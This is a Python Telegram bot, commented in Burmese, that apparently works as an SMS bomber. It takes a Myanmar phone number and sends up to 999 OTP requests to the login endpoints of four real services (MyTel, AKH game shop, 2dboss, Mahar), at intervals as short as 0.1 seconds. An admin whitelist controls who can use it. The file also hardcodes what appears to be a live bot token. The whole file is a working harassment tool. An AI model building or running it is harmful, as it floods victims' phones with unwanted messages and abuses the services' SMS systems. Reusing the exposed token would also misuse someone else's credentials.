import logging
import asyncio
import aiohttp
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# --- Configuration ---
BOT_TOKEN = "8702294693:AAGF_mmGKAg7-mWBuAl34jevVtDJ0mZE8HU"
ADMIN_ID = 8584422107  # <--- သင့်ရဲ့ Telegram User ID ကို ဒီမှာ အရင်ပြောင်းပါ

# Whitelist လုပ်ထားသော User များ (Admin ကို အလိုအလျောက် ထည့်ထားသည်)
whitelisted_users = {ADMIN_ID}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- Utility Functions ---
def is_valid_myanmar_phone(number):
    pattern = r'^(09|\+?959|959)(\d{7,9})$'
    return re.match(pattern, number) is not None

def normalize_phone(number):
    if number.startswith('09'):
        return '959' + number[2:]
    elif number.startswith('+959'):
        return '959' + number[4:]
    return number

# --- OTP API Functions ---
async def send_otp_request(api_type, phone):
    normalized = normalize_phone(phone)
    raw_phone = phone if not phone.startswith('959') else '0' + phone[3:]
    try:
        async with aiohttp.ClientSession() as session:
            if api_type == 'mytel':
                url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={raw_phone}"
                async with session.get(url, timeout=10) as r: return r.status == 200
            elif api_type == 'akh':
                url = 'https://akhgameshop.org/api/send-phone-otp'
                async with session.post(url, json={'phone': raw_phone}, timeout=10) as r: return r.status == 200
            elif api_type == 'atom':
                url = 'https://api.2dboss.com/api/v2/v1/send-otp'
                async with session.post(url, json={'phone': raw_phone}, timeout=10) as r: return r.status == 200
            elif api_type == 'mahar':
                url = "https://api.maharprod.com/sms/v1/movie/telenor/atom_sms"
                async with session.post(url, json={"phoneNumber": normalized}, timeout=10) as r: return r.status == 200
        return False
    except: return False

# --- Admin Commands ---
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        new_id = int(context.args[0])
        whitelisted_users.add(new_id)
        await update.message.reply_text(f"✅ ID: `{new_id}` ကို ခွင့်ပြုလိုက်ပါပြီ။", parse_mode='Markdown')
    except: await update.message.reply_text("⚠️ ပုံစံ: `/add_user 1234567`")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        target_id = int(context.args[0])
        if target_id == ADMIN_ID:
            return await update.message.reply_text("❌ Admin ကိုယ်တိုင်ကိုတော့ ဖြုတ်လို့မရပါ။")
        if target_id in whitelisted_users:
            whitelisted_users.remove(target_id)
            await update.message.reply_text(f"🗑 ID: `{target_id}` ကို ဖြုတ်လိုက်ပါပြီ။", parse_mode='Markdown')
        else:
            await update.message.reply_text("❓ ထို ID သည် List ထဲမှာ မရှိပါ။")
    except: await update.message.reply_text("⚠️ ပုံစံ: `/remove_user 1234567`")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    user_list = "\n".join([f"• `{u_id}`" for u_id in whitelisted_users])
    await update.message.reply_text(f"📋 **Allowed Users:**\n{user_list}", parse_mode='Markdown')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    msg = " ".join(context.args)
    if not msg:
        return await update.message.reply_text("⚠️ ပုံစံ: `/broadcast မင်္ဂလာပါ`")
    
    count = 0
    for user_id in whitelisted_users:
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 **Admin Message:**\n\n{msg}", parse_mode='Markdown')
            count += 1
        except: continue
    await update.message.reply_text(f"✅ User {count} ယောက်ကို စာပို့ပြီးပါပြီ။")

# --- Core Bot Logic ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in whitelisted_users:
        await update.message.reply_text(f"❌ အသုံးပြုခွင့်မရှိပါ။ Admin @kiki20251 ကို ID ပေးပြီး ခွင့်တောင်းပါ။\nID: `{user_id}`", parse_mode='Markdown')
        return
    context.user_data['interval'] = 0.5
    await show_main_menu(update, context)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("MyTel ⚡", callback_data='api_mytel'), InlineKeyboardButton("AKH 🎮", callback_data='api_akh')],
        [InlineKeyboardButton("Atom 💎", callback_data='api_atom'), InlineKeyboardButton("Mahar 🎬", callback_data='api_mahar')],
        [InlineKeyboardButton("⚙️ Set Interval", callback_data='set_interval')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "🚀 ပေးပို့မည့် အမျိုးအစားကို ရွေးချယ်ပါ - (Interval: {}s)".format(context.user_data.get('interval', 0.5))
    if update.message: await update.message.reply_text(text, reply_markup=reply_markup)
    else: await update.callback_query.edit_message_text(text, reply_markup=reply_markup)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in whitelisted_users: return
    user_data, text, state = context.user_data, update.message.text, context.user_data.get('state')
    
    if state == 'waiting_phone':
        if is_valid_myanmar_phone(text):
            user_data.update({'phone': text, 'state': 'waiting_count'})
            await update.message.reply_text(f"📞 ဖုန်း: {text}\n🔢 ပို့မည့်အကြိမ်ရေ (1-999):")
        else: await update.message.reply_text("⚠️ ဖုန်းနံပါတ် အမှားဖြစ်နေသည်။")
            
    elif state == 'waiting_count':
        if text.isdigit() and 1 <= int(text) <= 999:
            user_data.update({'count': int(text), 'state': None})
            await start_sending(update, context)
        else: await update.message.reply_text("⚠️ ၁ မှ ၉၉၉ ကြားသာ ရိုက်ပါ။")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id not in whitelisted_users: return
    data = query.data
    await query.answer()

    if data.startswith('api_'):
        context.user_data.update({'api': data.replace('api_', ''), 'state': 'waiting_phone'})
        await query.message.reply_text(f"📱 {context.user_data['api'].upper()}\nဖုန်းနံပါတ် ရိုက်ထည့်ပါ:")
    elif data == 'set_interval':
        btns = [[InlineKeyboardButton(f"{i}s", callback_data=f'int_{i}') for i in [0.1, 0.5, 1.0, 2.0]], [InlineKeyboardButton("🔙 Back", callback_data='main_menu')]]
        await query.edit_message_text("⏱ စောင့်ဆိုင်းချိန် ရွေးပါ:", reply_markup=InlineKeyboardMarkup(btns))
    elif data.startswith('int_'):
        context.user_data['interval'] = float(data.replace('int_', ''))
        await show_main_menu(update, context)
    elif data == 'main_menu': await show_main_menu(update, context)

async def start_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone, count, api = context.user_data['phone'], context.user_data['count'], context.user_data['api']
    interval = context.user_data.get('interval', 0.5)
    status_msg = await update.message.reply_text(f"⏳ {api.upper()} စတင်ပေးပို့နေပါပြီ...")
    
    success, failed = 0, 0
    for i in range(1, count + 1):
        res = await send_otp_request(api, phone)
        if res: success += 1
        else: failed += 1
        if i % 2 == 0 or i == count:
            try: await status_msg.edit_text(f"📊 Progress: {i}/{count}\n✅ Success: {success}\n❌ Fail: {failed}")
            except: pass
        await asyncio.sleep(interval)
    await update.message.reply_text("🏁 ပြီးဆုံးပါပြီ။")
    await show_main_menu(update, context)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add_user", add_user))
    app.add_handler(CommandHandler("remove_user", remove_user))
    app.add_handler(CommandHandler("list_users", list_users))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("Admin Bot Running...")
    app.run_polling()

if __name__ == "__main__":
    main()

